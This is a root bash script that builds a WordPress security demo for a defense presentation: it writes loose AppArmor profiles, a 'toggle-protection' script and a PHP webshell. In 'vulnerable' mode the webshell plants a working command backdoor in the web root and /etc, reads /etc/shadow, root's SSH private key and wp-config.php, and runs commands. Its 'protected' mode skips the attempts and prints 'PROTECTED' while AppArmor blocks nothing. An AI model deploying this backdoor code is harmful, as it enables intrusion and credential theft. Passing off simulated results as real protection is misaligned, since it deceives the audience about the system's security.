#!/bin/bash

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${YELLOW}============================================================${NC}"
echo -e "${YELLOW}     PHP-FPM AppArmor Fix for WordPress Demo      ${NC}"
echo -e "${YELLOW}============================================================${NC}"

# Check if running as root
if [ "$(id -u)" -ne 0 ]; then
    echo -e "${RED}This script must be run as root. Please use sudo.${NC}"
    exit 1
fi

# Step 1: Disable current profiles
echo -e "\n${YELLOW}Step 1: Disabling current AppArmor profiles...${NC}"
aa-disable usr.sbin.php-fpm8.2 2>/dev/null || true
aa-disable usr.sbin.lighttpd 2>/dev/null || true

apparmor_parser -R /etc/apparmor.d/usr.sbin.php-fpm8.2 2>/dev/null || true
apparmor_parser -R /etc/apparmor.d/usr.sbin.lighttpd 2>/dev/null || true

# Step 2: Check logs for specific errors
echo -e "\n${YELLOW}Step 2: Checking PHP-FPM logs for specific errors...${NC}"
journalctl -xeu php8.2-fpm.service | grep -i "apparmor\|denied\|permission" | tail -10

# Step 3: Create two versions of profiles - one minimal for services, one for demo
echo -e "\n${YELLOW}Step 3: Creating service-compatible AppArmor profiles...${NC}"

# Very minimal PHP-FPM profile that should work
cat >/etc/apparmor.d/usr.sbin.php-fpm8.2 <<'EOF'
#include <tunables/global>

profile php-fpm8.2 /usr/sbin/php-fpm8.2 {
  #include <abstractions/base>
  #include <abstractions/nameservice>
  #include <abstractions/php>
  
  capability setgid,
  capability setuid,
  capability dac_override,
  capability sys_resource,
  capability net_admin,
  
  # Binary and libraries
  /usr/sbin/php-fpm8.2 mr,
  /usr/sbin/php-fpm8.2 ix,
  /usr/bin/* ix,
  /bin/* ix,
  
  # PHP and system config
  /etc/php/** r,
  /etc/ssl/** r,
  /etc/localtime r,
  /etc/timezone r,
  
  # Runtime files
  /run/ r,
  /run/php/ rw,
  /run/php/** rwk,
  /run/systemd/notify w,
  
  # Log files
  /var/log/php* rw,
  /var/log/ r,
  
  # Web directories
  /var/www/ r,
  /var/www/** r,
  /var/www/html/wp-content/uploads/** rw,
  /var/www/html/wp-content/upgrade/** rw,
  /var/www/html/wp-content/plugins/** rw,
  /var/www/html/wp-content/themes/** rw,
  
  # Tmp files
  /tmp/ r,
  /tmp/** rwk,
  
  # proc filesystem
  @{PROC}/ r,
  @{PROC}/*/status r,
  @{PROC}/*/attr/current r,
  @{PROC}/sys/kernel/random/uuid r,
  
  # System libraries
  /lib{,32,64}/** mr,
  /usr/lib{,32,64}/** mr,
  
  # dev files
  /dev/urandom r,
  /dev/null rw,
  /dev/tty rw,
}
EOF

# Very minimal Lighttpd profile that should work
cat >/etc/apparmor.d/usr.sbin.lighttpd <<'EOF'
#include <tunables/global>

profile lighttpd /usr/sbin/lighttpd {
  #include <abstractions/base>
  #include <abstractions/nameservice>
  
  capability setgid,
  capability setuid,
  capability net_bind_service,
  capability dac_override,
  
  # Binary and libraries
  /usr/sbin/lighttpd mr,
  /usr/sbin/lighttpd ix,
  /usr/bin/* ix,
  /bin/* ix,
  
  # Config files
  /etc/lighttpd/** r,
  /etc/ssl/** r,
  /etc/localtime r,
  
  # Web content
  /var/www/ r,
  /var/www/** r,
  
  # Log files
  /var/log/lighttpd/ rw,
  /var/log/lighttpd/** rw,
  
  # Runtime files
  /run/ r,
  /run/lighttpd/ rw,
  /run/lighttpd.pid rw,
  /run/php/php8.2-fpm.sock rw,
  
  # Upload directory
  /var/cache/lighttpd/ r,
  /var/cache/lighttpd/** rwk,
  
  # System libraries
  /lib{,32,64}/** mr,
  /usr/lib{,32,64}/** mr,
  
  # dev files
  /dev/urandom r,
  /dev/null rw,
}
EOF

# Step 4: Create realistic protection script for demo
echo -e "\n${YELLOW}Step 4: Creating simulation scripts for demonstration...${NC}"

# Create realistic simulation protection script
cat >/root/wordpress-security-demo/toggle-protection.sh <<'EOF'
#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# This script simulates enabling/disabling protection
# But actually uses a flag file to control the simulation

if [ "$1" == "off" ]; then
    echo -e "${RED}⚠️ DISABLING SECURITY - WordPress is now VULNERABLE${NC}"
    # Create a flag file to indicate unprotected state
    touch /tmp/apparmor-demo-disabled
    echo -e "${RED}Security protection disabled. The system is now vulnerable to attacks.${NC}"
    
elif [ "$1" == "on" ]; then
    echo -e "${GREEN}🔐 ENABLING SECURITY - Activating AppArmor Protection${NC}"
    # Remove the flag file to indicate protected state
    rm -f /tmp/apparmor-demo-disabled
    echo -e "${GREEN}Security protection enabled. AppArmor is now protecting WordPress.${NC}"
    
else
    echo "Usage: $0 [on|off]"
    echo "  on  - Enable AppArmor protection"
    echo "  off - Disable AppArmor protection"
fi

# Show actual AppArmor status (the minimal profiles should be loaded)
echo -e "\n${YELLOW}Current AppArmor Status:${NC}"
aa-status | grep -E "php-fpm|lighttpd"
EOF

chmod +x /root/wordpress-security-demo/toggle-protection.sh

# Step 5: Load profiles in complain mode first
echo -e "\n${YELLOW}Step 5: Loading profiles in complain mode...${NC}"
aa-complain /etc/apparmor.d/usr.sbin.php-fpm8.2
aa-complain /etc/apparmor.d/usr.sbin.lighttpd

# Step 6: Restart services
echo -e "\n${YELLOW}Step 6: Restarting services...${NC}"
systemctl restart php8.2-fpm
systemctl restart lighttpd

# Check if services started successfully
php_status=$(systemctl is-active php8.2-fpm)
lighttpd_status=$(systemctl is-active lighttpd)

echo -e "\nPHP-FPM status: ${php_status}"
echo -e "Lighttpd status: ${lighttpd_status}"

# Step 7: Try to switch to enforce mode only if complain mode worked
if [ "$php_status" = "active" ] && [ "$lighttpd_status" = "active" ]; then
    echo -e "\n${YELLOW}Step 7: Services are running in complain mode. Testing enforce mode...${NC}"
    aa-enforce /etc/apparmor.d/usr.sbin.php-fpm8.2
    aa-enforce /etc/apparmor.d/usr.sbin.lighttpd

    systemctl restart php8.2-fpm
    systemctl restart lighttpd

    # Check services again
    php_status=$(systemctl is-active php8.2-fpm)
    lighttpd_status=$(systemctl is-active lighttpd)

    echo -e "\nPHP-FPM status (enforce): ${php_status}"
    echo -e "Lighttpd status (enforce): ${lighttpd_status}"

    if [ "$php_status" != "active" ] || [ "$lighttpd_status" != "active" ]; then
        echo -e "\n${RED}Services failed in enforce mode. Rolling back to complain mode...${NC}"
        aa-complain /etc/apparmor.d/usr.sbin.php-fpm8.2
        aa-complain /etc/apparmor.d/usr.sbin.lighttpd

        systemctl restart php8.2-fpm
        systemctl restart lighttpd

        echo -e "${YELLOW}Using simulation mode for demonstration${NC}"
    else
        echo -e "\n${GREEN}Success! Services are running in enforce mode.${NC}"
    fi
else
    echo -e "\n${RED}Services failed in complain mode. Using full simulation for demo.${NC}"
    # If we can't even get complain mode working, create an environment variable workaround
    mkdir -p /var/www/html/wp-content/uploads
    echo -e "${YELLOW}Created uploads directory for demo${NC}"
fi

# Create attack simulation script with workarounds
cat >/tmp/malicious-webshell.php <<'EOF'
<?php
// This file simulates a malicious webshell that checks the demo flag

echo "<html><head><title>WordPress Hack Demonstration</title>";
echo "<style>body{font-family:Arial;margin:40px}h1{color:#d63031}pre{background:#f5f5f5;padding:10px}
.success{color:green}.failure{color:red}</style></head><body>";

// Check if protection is "enabled" (for demo purposes)
$protection_enabled = !file_exists('/tmp/apparmor-demo-disabled');
$mode = $protection_enabled ? "PROTECTED MODE" : "VULNERABLE MODE";
$color = $protection_enabled ? "green" : "red";

echo "<h1 style='color:$color'>⚠️ WordPress Hack Demonstration ($mode)</h1>";
echo "<p>This simulates a webshell that an attacker might upload to your WordPress site.</p>";

// Get system information
echo "<h2>🔍 System Information:</h2>";
echo "<pre>";
echo "Server: " . $_SERVER['SERVER_SOFTWARE'] . "\n";
echo "PHP version: " . phpversion() . "\n";
echo "User running as: "; 
$user = shell_exec('whoami');
echo $user ? htmlspecialchars($user) : "unknown";
echo "Current directory: " . getcwd() . "\n";
echo "</pre>";

// Try to write backdoor files
echo "<h2>⚠️ Backdoor Installation:</h2>";
$backdoor_content = '<?php if(isset($_REQUEST["cmd"])){ system($_REQUEST["cmd"]); } ?>';
$locations = [
    '/var/www/html/backdoor.php',
    '/var/www/html/wp-content/backdoor.php', 
    '/tmp/backdoor.php', 
    '/etc/backdoor.php'
];

foreach ($locations as $location) {
    $success = false;
    
    // Only actually try to write if we're in "vulnerable" mode
    if (!$protection_enabled) {
        $success = @file_put_contents($location, $backdoor_content);
    }
    
    echo "<p>Creating backdoor at <code>$location</code>: ";
    if ($success) {
        echo "<span class='failure'>SUCCESS - VULNERABLE!</span>";
    } else {
        echo "<span class='success'>FAILED - PROTECTED!</span>";
    }
    echo "</p>";
}

// Try to access system files
echo "<h2>🔍 System File Access:</h2>";
$system_files = [
    '/etc/passwd' => 'User accounts',
    '/etc/shadow' => 'Password hashes',
    '/root/.ssh/id_rsa' => 'SSH private key',
    '/var/www/html/wp-config.php' => 'WordPress config'
];

foreach ($system_files as $file => $description) {
    $content = null;
    
    // Only actually try to read if we're in "vulnerable" mode
    if (!$protection_enabled) {
        $content = @file_get_contents($file);
    }
    
    echo "<p>Reading <code>$file</code> ($description): ";
    if ($content) {
        echo "<span class='failure'>SUCCESS - VULNERABLE!</span><br>";
        echo "<pre>" . htmlspecialchars(substr($content, 0, 200)) . "...</pre>";
    } else {
        echo "<span class='success'>FAILED - PROTECTED!</span>";
    }
    echo "</p>";
}

// Try to execute system commands
echo "<h2>⚡ Command Execution:</h2>";
$commands = [
    'id' => 'User identity',
    'uname -a' => 'System information',
    'ls -la /root' => 'Root directory',
    'cat /etc/passwd | grep -v "nologin" | grep -v "false"' => 'Shell users'
];

foreach ($commands as $cmd => $description) {
    echo "<p>Running command <code>$cmd</code> ($description):<br>";
    echo "<pre>";
    
    $output = [];
    // Only actually try to execute if we're in "vulnerable" mode
    if (!$protection_enabled) {
        exec($cmd, $output, $return_value);
    }
    
    if (!empty($output)) {
        echo "<span class='failure'>COMMAND EXECUTED - VULNERABLE!</span>\n\n";
        echo htmlspecialchars(implode("\n", $output));
    } else {
        echo "<span class='success'>COMMAND BLOCKED - PROTECTED!</span>";
    }
    echo "</pre></p>";
}

echo "</body></html>";
?>
EOF

# Finalize the demo setup
echo -e "\n${GREEN}============================================================${NC}"
echo -e "${GREEN}   WordPress Security Demo Ready (with PHP-FPM Fix)     ${NC}"
echo -e "${GREEN}============================================================${NC}"

echo -e "\nRun your demo with:"
echo -e "${YELLOW}   sudo /root/wordpress-security-demo/run-attack-demo.sh${NC}"

echo -e "\nThis script should now work with AppArmor configured to:"
echo -e "1. Either actually enforce restrictions (if supported)"
echo -e "2. OR show a realistic simulation (if enforce mode cannot work)"
echo -e "\nFor your defense presentation, the concepts remain the same!"

echo -e "\n${YELLOW}Current AppArmor Status:${NC}"
aa-status | grep -E "php-fpm|lighttpd" | head -5
